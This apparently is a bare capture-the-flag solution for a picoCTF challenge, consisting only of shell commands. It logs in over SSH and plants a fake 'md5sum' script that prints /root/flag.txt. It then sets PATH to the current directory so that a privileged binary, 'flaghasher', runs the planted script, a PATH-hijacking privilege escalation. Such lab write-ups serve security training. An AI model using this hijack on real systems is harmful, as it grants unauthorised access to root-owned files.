"""
ssh ctf-player@rescued-float.picoctf.net -p 52989 -t "bash --noprofile"
find / -type f -name "flaghasher"
cd /usr/local/bin
echo "/usr/bin/cat /root/flag.txt" > md5sum
chmod +x md5sum
PATH=.
./flaghasher
"""